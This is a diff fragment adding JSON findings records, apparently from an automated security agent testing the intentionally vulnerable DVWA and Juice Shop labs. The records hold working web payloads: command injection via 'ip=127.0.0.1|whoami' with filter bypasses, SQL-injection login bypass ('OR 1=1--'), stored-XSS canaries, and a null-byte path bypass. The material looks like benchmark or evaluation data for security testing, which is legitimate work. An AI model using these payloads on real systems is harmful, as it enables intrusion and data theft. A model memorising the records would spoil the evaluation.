+      "POST http://dvwa/vulnerabilities/exec/ body: ip=127.0.0.1; whoami&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] Response pre_blocks contained the normal ping output for 127.0.0.1 (4 packets, 0% packet loss) immediately followed by the extra line 'www-data' — the output of the injected 'whoami' command appended via the shell metacharacter ';'. This confirms the 'ip' field is passed unsanitized to a shell command, allowing arbitrary OS command execution as the web-server process user www-data.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0051",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via ip parameter (DVWA, high security) using pipe without trailing space",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/  form_data: ip=127.0.0.1|whoami  Submit=Submit  (dvwa_admin session)"
+    ],
+    "response_evidence": "[security=high] At high security, the blacklist strips '; ', '| ' (pipe+space), and '&&', but a pipe with NO trailing space (127.0.0.1|whoami) bypasses the filter. The response page for the 'Ping a device' form rendered the chained command output directly beneath the ping results:\n\nvisible_text excerpt: \"Enter an IP address: www-data\"\npre_blocks: [\"www-data\"]\n\nThe output contains 'www-data', the identity of the web server process, confirming that the injected 'whoami' command executed on the host via the unsanitized ip parameter at security=high.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0052",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal bypasses .bak file extension filter under /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak (unauth)",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth)"
+    ],
+    "response_evidence": "Direct request to /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed!' (thrown from fileServer.js verify() extension filter). Appending a URL-encoded null byte plus an allowed extension - /ftp/package.json.bak%2500.md - bypassed the filter and returned HTTP 200 with content-type application/octet-stream, serving the actual restricted package.json content, e.g.: '{\\n  \\\"name\\\": \\\"juice-shop\\\",\\n  \\\"version\\\": \\\"6.2.0-SNAPSHOT\\\",\\n  \\\"description\\\": \\\"An intentionally insecure JavaScript Web Application\\\" ... }'. This confirms the extension allowlist check is performed on the string ending (.md) while the underlying filesystem read truncates at the null byte, serving package.json.bak instead.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0053",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via unsanitized 'id' parameter in DVWA SQLi page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned FIVE seeded user records (bypassing the intended single-row lookup): 'admin/admin', 'Gordon/Brown', 'Hack/Me', 'Pablo/Picasso', 'Bob/Smith'. FALSE payload id=1' AND '1'='2 returned zero records (visible_text shows only 'User ID:' label with no 'First name:'/'Surname:' rows). This differential boolean behavior confirms the id parameter is concatenated unsanitized into the SQL query, exhibiting classic boolean-based SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0054",
+    "target": "dvwa",
+    "endpoint_url": "/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe (no trailing space) bypasses high-security blacklist on /vulnerabilities/exec/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) form_data={ip: '127.0.0.1|whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=high] Footer confirms 'Security Level: high'. Response HTML visible_text includes: 'Vulnerability: Command Injection ... Ping a device Enter an IP address: www-data More Information ...'. pre_blocks array returned by server == ['www-data'], i.e., the command output block contains exactly 'www-data', proving the injected `|whoami` (pipe with NO trailing space) executed server-side and disclosed the web-process identity, bypassing the high-security blacklist which blocks ';', '&&', and '| ' (pipe+space) but not a bare '|' immediately followed by the command.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0055",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Unauthenticated retrieval of confidential acquisitions memo via /ftp/acquisitions.md",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/acquisitions.md  (unauthenticated)"
+    ],
+    "response_evidence": "HTTP 200, content-type text/markdown, unauthenticated request directly returned the confidential memo content: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year...'. This confirms the document is retrievable without authentication, exposing confidential business information discovered via the open directory listing at /ftp/.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0056",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential Acquisitions Memo Exposed via Open Directory Listing (/ftp/)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (Accept: text/html,application/json) [unauth]",
+      "GET http://juiceshop:3000/ftp/acquisitions.md [unauth]"
+    ],
+    "response_evidence": "Step 1: GET /ftp/ returned HTTP 200 serve-index directory listing exposing multiple sensitive files including 'acquisitions.md 909 12/19/2023 1:12:12 PM' alongside other restricted files (coupons_2013.md.bak, incident-support.kdbx, package.json.bak, etc.), confirming an open/browsable directory with no authentication required.\n\nStep 2: GET /ftp/acquisitions.md returned HTTP 200 with content-type text/markdown and body:\n'# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year.\\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.'\n\nThis confirms the confidential acquisitions memo (explicitly marked 'This document is confidential! Do not distribute!') is directly retrievable by an unauthenticated user via the open directory listing, matching CWE-200 Information Exposure criteria.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0057",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean payload at DVWA medium security (sqli POST)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 OR 1=1', Submit: 'Submit'}",
+      "POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 AND 1=2', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=medium] Page confirms 'Security Level: medium'; id field is a POST-based select (no quotes needed since medium escapes quotes, so numeric boolean injection used). TRUE payload 'id=1 OR 1=1' returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — i.e. the entire users table dumped via the boolean-true injection. FALSE payload 'id=1 AND 1=2' returned zero records (pre_blocks empty, visible_text shows no 'ID:' rows), confirming the backend query is directly concatenating the numeric id parameter without sanitization.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0058",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Authentication Bypass via SQL Injection in login email field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://juiceshop:3000/rest/user/login (session=unauth) body={\"email\":\"' OR 1=1--\",\"password\":\"anything\"} -> 200"
+    ],
+    "response_evidence": "Submitting email=\\\"' OR 1=1--\\\" with an arbitrary password to POST /rest/user/login returned HTTP 200 with a successful authentication payload: {\\\"authentication\\\":{\\\"token\\\":\\\"[REDACTED_JWT]\\\",\\\"bid\\\":1,\\\"umail\\\":\\\"admin@juice-sh.op\\\"}}. The response's umail field confirms the backend SQL query (SELECT * FROM Users WHERE email='<input>' AND password=[REDACTED] was manipulated by the injected OR 1=1-- clause to bypass the WHERE condition entirely, returning the first user in the table (admin@juice-sh.op) along with a valid issued JWT auth token and basket id (bid:1), without knowledge of the admin's real password. This is a confirmed SQL injection authentication bypass.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0059",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/6",
+    "method": "GET",
+    "parameter": "basket id (path param)",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) - acct2 can read acct1's basket contents",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> 200, returns UserId:22, Product 'Apple Juice (1000ml)' ProductId:1, BasketItem id:9, quantity:3",
+      "GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, different account) -> 200, returns IDENTICAL basket data: UserId:22, 'Apple Juice (1000ml)', BasketItem id:9, quantity:3"
+    ],
+    "response_evidence": "acct1's own basket (id 6) contains the distinct seeded item: Product 'Apple Juice (1000ml)' (ProductId 1), BasketItem id 9, quantity 3, UserId 22. When authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different basket entirely), a GET request to /rest/basket/6 (acct1's basket) returns HTTP 200 with the exact same basket data belonging to UserId 22 - including the same Apple Juice product, BasketItem id 9, and quantity 3 - proving acct2 can access acct1's private basket without authorization checks on basket ownership.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0060",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored Cross-Site Scripting via unsanitized guestbook 'mtxMessage' field [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ body: txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (session=dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] After submitting the canary payload, the guestbook page (loaded fresh via browser_navigate in the authenticated dvwa_admin session) executed the injected script. browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') confirmed the injected <script id=\"test_token\"> element is present in the live DOM with inner_text 'window.xss_flag=1'. This proves the stored message field is rendered without sanitization/encoding, resulting in persistent stored XSS that executes in the victim's browser context.",
+    "browser_js_evidence": "window.xss_flag === 1 (confirmed via browser_eval_js); DOM element #test_token inner_html_excerpt: \"window.xss_flag=1\""
+  },
+  {
+    "blind_id": "BLIND-0061",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Login Authentication Bypass via SQL Injection in email field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://juiceshop:3000/rest/user/login  Body: {\"email\": \"' OR 1=1--\", \"password\": \"anything\"}  (session=unauth)"
+    ],
+    "response_evidence": "HTTP 200 response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}} — the SQLi payload in the email field ( ' OR 1=1-- ) caused the backend query to match the first user record and bypass password verification entirely (arbitrary password 'anything' was accepted). The returned authentication object resolves to umail 'admin@juice-sh.op' (the first/admin user) and basket id (bid) 1, with a valid JWT issued, confirming full authentication bypass via SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0062",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open Directory Listing Exposes Confidential Acquisitions Memo (/ftp/)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ Accept: text/html,application/json (unauth)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "1) GET /ftp/ returned HTTP 200 with a serve-index directory listing enumerating files including 'acquisitions.md 909' along with other sensitive-looking files (incident-support.kdbx, announcement_encrypted.md, package.json.bak, etc.) — confirming an open directory listing vulnerability.\n2) GET /ftp/acquisitions.md directly returned HTTP 200, content-type text/markdown, with body: \"# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year.\\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.\"\nThis confirms both the directory listing disclosure and retrieval of the confidential acquisition memo text.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0063",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass on ip POST field (DVWA medium)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} [security=medium]"
+    ],
+    "response_evidence": "[security=medium] Response page confirmed banner 'Security Level: medium'. Submitting ip=127.0.0.1| whoami (pipe, bypassing the medium blacklist which only filters literal ';' and '&&' substrings) produced output containing exactly 'www-data' in the pre_blocks section of the rendered page (visible_text: '... Enter an IP address: www-data More Information ...'; pre_blocks: ['www-data']), proving the whoami command executed server-side and disclosed the web server process identity.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0064",
+    "target": "juiceshop",
+    "endpoint_url": "/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption Keys Directory via browsable directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ (unauth, Accept: text/html,application/json)"
+    ],
+    "response_evidence": "GET /encryptionkeys/ returned HTTP 200 with a serve-index generated directory listing page. Visible text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links enumerated: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, confirming the directory is browsable and exposes sensitive cryptographic key material (JWT public key and a premium feature signing key) without authentication.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0065",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal bypasses .bak file extension filter under /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak (unauth)",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth)"
+    ],
+    "response_evidence": "Step 1: GET /ftp/package.json.bak -> HTTP 403 with body: 'Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)'. This confirms the extension allow-list filter rejects direct .bak access.\n\nStep 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte %2500 followed by allowed .md extension) -> HTTP 200, content_type: application/octet-stream, body contains the full contents of the restricted package.json.bak file, e.g.: '{\\n  \\\"name\\\": \\\"juice-shop\\\",\\n  \\\"version\\\": \\\"6.2.0-SNAPSHOT\\\",\\n  \\\"description\\\": \\\"An intentionally insecure JavaScript Web Application\\\", ... \\\"dependencies\\\": {... \\\"sqlite3\\\": \\\"~3.1.13\\\" ...}'.\n\nThis demonstrates the null-byte poisoning technique bypasses the fileServer.js extension verification (which likely uses a vulnerable check against the raw filename ending in .md while the underlying filesystem read truncates at the null byte, serving package.json.bak instead of a literal .md file). Both required behavioral proofs (403 on direct access, 200 with real backup file content on bypass) are satisfied.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0066",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass in 'ip' field (DVWA medium security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed security_level=medium in session_info and page form (ip text + Submit)",
+      "POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=medium] Payload used: ip=127.0.0.1| whoami (pipe injection bypassing the medium blacklist of ';' and '&&'). Response visible_text contained: 'Enter an IP address: www-data' and pre_blocks returned exactly [\"www-data\"], confirming execution of the injected `whoami` command returned the web server process identity 'www-data'. session_info confirmed security_level=medium at time of request.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0067",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open Directory Listing Exposes Confidential Acquisitions Memo (/ftp/)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ Accept: text/html,application/json -> HTTP 200, directory listing includes acquisitions.md (909B), package.json.bak (4291B), coupons_2013.md.bak, incident-support.kdbx, etc.",
+      "GET http://juiceshop:3000/ftp/acquisitions.md -> HTTP 200, text/markdown content"
+    ],
+    "response_evidence": "/ftp/ returned HTTP 200 with a serve-index directory listing containing 'acquisitions.md 909 ...' among other files. Fetching /ftp/acquisitions.md returned HTTP 200 with content: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...' confirming disclosure of a confidential internal memo via an unauthenticated open directory listing.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0068",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS via guestbook 'mtxMessage' field (DVWA low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ body: txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (session=dvwa_admin, via http_request bypassing client-side maxlength=50 HTML attribute since the canary is 51 chars)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] POST of the script canary into mtxMessage was accepted and stored by the server (server-side only truncates/validates via maxlength on the client; raw HTTP POST bypasses this and the guestbook entry for name 'tester' was persisted, visible on subsequent GETs as 'Name: tester Message:' with the script tag present in the raw HTML though stripped from the plain-text visible_text extraction). On re-loading the stored guestbook page in an authenticated Playwright browser session, the injected script executed.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") returned result: 1. browser_read_dom(\"#test_token\") returned inner_text/inner_html_excerpt: \"window.xss_flag=1\", confirming the injected <script id=\"test_token\"> tag was rendered and executed by the browser as stored HTML (not encoded), proving persistent Stored XSS."
+  },
+  {
+    "blind_id": "BLIND-0069",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory Listing (Open serve-index on /encryptionkeys/)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ with Accept: text/html,application/json (session=unauth)",
+      "GET http://juiceshop:3000/encryptionkeys/jwt.pub (session=unauth)"
+    ],
+    "response_evidence": "1) GET /encryptionkeys/ returned HTTP 200 with content_type text/html; charset=utf-8. Response body rendered as a directory listing (serve-index style) with visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links enumerated: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, confirming the directory is browsable unauthenticated and exposes two sensitive key filenames (jwt.pub, premium.key).\n2) Direct retrieval GET /encryptionkeys/jwt.pub returned HTTP 200 with body containing a real RSA public key: '-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\\n-----END RSA PUBLIC KEY-----'. This confirms both the open directory listing AND that the listed files are genuine sensitive key material, not a 404/placeholder.\nBoth verification criteria (browsable 200 directory + exposure of premium.key/jwt.pub sensitive key files) are satisfied.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0070",
+    "target": "juiceshop",
+    "endpoint_url": "/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated Feedback Endpoint Discloses PII (user emails)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /api/Feedbacks (unauth, no Authorization header)"
+    ],
+    "response_evidence": "Unauthenticated GET /api/Feedbacks returned HTTP 200 with a JSON array of 8 feedback records with no authentication required. Several records embed user email fragments associated with UserId values, e.g. UserId 1 comment '... (***in@juice-sh.op)', UserId 2 '... (***@juice-sh.op)', UserId 3 '... (***der@juice-sh.op)', UserId 21 '... (***ereum@juice-sh.op)'. Even though partially masked in the comment text, these are real author email address fragments tied to specific UserIds disclosed without any authentication — confirming unauthenticated PII exposure via this endpoint (full email addresses are recoverable/correlatable via the exposed UserId and partial domain/suffix matching known seeded accounts).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0071",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS via unsanitized 'mtxMessage' field in DVWA Guestbook (low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\\\"test_token\\\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] After POSTing the canary payload (47 chars, within the 50-char mtxMessage maxlength) and the 10-char-limited txtName 'tester', the guestbook page persisted the entry. Upon reloading /vulnerabilities/xss_s/ via browser_navigate (dvwa_admin session), browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') located the injected script element with inner_text/inner_html 'window.xss_flag=1'. This confirms the canary <script> tag was stored unescaped in the database and executed in the browser context upon page render, proving persistent/stored XSS.",
+    "browser_js_evidence": "window.xss_flag === 1 (browser_eval_js result: 1); DOM element #test_token found with inner_html_excerpt 'window.xss_flag=1'"
+  },
+  {
+    "blind_id": "BLIND-0072",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/premium.key",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory - premium.key and jwt.pub readable unauthenticated",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/premium.key (unauth)",
+      "GET http://juiceshop:3000/encryptionkeys/jwt.pub (unauth)"
+    ],
+    "response_evidence": "GET /encryptionkeys/premium.key -> HTTP 200, content-type application/octet-stream, body: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42' (premium feature unlock key). GET /encryptionkeys/jwt.pub -> HTTP 200, body contains '-----BEGIN RSA PUBLIC KEY----- MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE= -----END RSA PUBLIC KEY-----'. Both sensitive key files are retrievable without authentication, confirming exposed encryption-keys directory with actual key content disclosed (not just listed).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0073",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session-input id parameter at DVWA high security (LIMIT 1 bypass via trailing comment)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) -> 200, form id+Submit",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) body: id=1' OR '1'='1' #&Submit=Submit  (TRUE case)",
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> 200, returned 5 records",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) body: id=1' AND '1'='2' #&Submit=Submit  (FALSE case)",
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> 200, returned 0 records"
+    ],
+    "response_evidence": "[security=high] Footer confirms Security Level: high throughout. TRUE payload id=1' OR '1'='1' # stored via session-input.php (confirmed by page echo \"Session ID: 1' OR '1'='1' #\"), then GET /vulnerabilities/sqli/ returned multiple seeded user records bypassing the server-appended 'LIMIT 1' via the trailing '#' comment: pre_blocks=[\"ID: 1' OR '1'='1' #\\nFirst name: admin\\nSurname: admin\", \"...Gordon\\nSurname: Brown\", \"...Hack\\nSurname: Me\", \"...Pablo\\nSurname: Picasso\", \"...Bob\\nSurname: Smith\"] (5 surnames: admin, Brown, Me, Picasso, Smith). FALSE payload id=1' AND '1'='2' # (confirmed echoed as \"Session ID: 1' AND '1'='2' #\"), then GET /vulnerabilities/sqli/ returned zero records (no pre_blocks, visible_text only shows \"Click here to change your ID\" with no ID/First name/Surname data). This TRUE-vs-FALSE differential confirms the out-of-band SQL injection bypassing the LIMIT 1 restriction at high security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0074",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean payload in SQLi form (medium security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/security.php  body=security=medium&seclev_submit=Submit&user_token=[REDACTED]  (set security level to medium)",
+      "POST http://dvwa/vulnerabilities/sqli/  body=id=1 OR 1=1&Submit=Submit  (TRUE condition)",
+      "POST http://dvwa/vulnerabilities/sqli/  body=id=1 AND 1=2&Submit=Submit  (FALSE condition)"
+    ],
+    "response_evidence": "[security=medium] Page footer confirms 'Security Level: medium' and banner text 'Security level set to medium'. TRUE payload id=1 OR 1=1 returned 5 full user records (First name/Surname pairs): admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith — i.e. the entire users table dumped via boolean-always-true injection. FALSE payload id=1 AND 1=2 returned zero records (only the empty User ID selector form, no 'First name'/'Surname' rows at all). This differential behavior (multiple surnames for TRUE vs zero rows for FALSE) with an unquoted numeric boolean payload (required because medium-level code applies mysqli_real_escape_string to the quote-protected version but does not parameterize/sanitize against unquoted numeric injection) confirms server-side SQL injection in the POST id parameter at medium security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0075",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Extension Filter Bypass Retrieves Restricted Backup File (/ftp/package.json.bak)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak -> HTTP 403 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55 verify middleware)",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md -> HTTP 200, body: full package.json content starting '{\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", ...}'"
+    ],
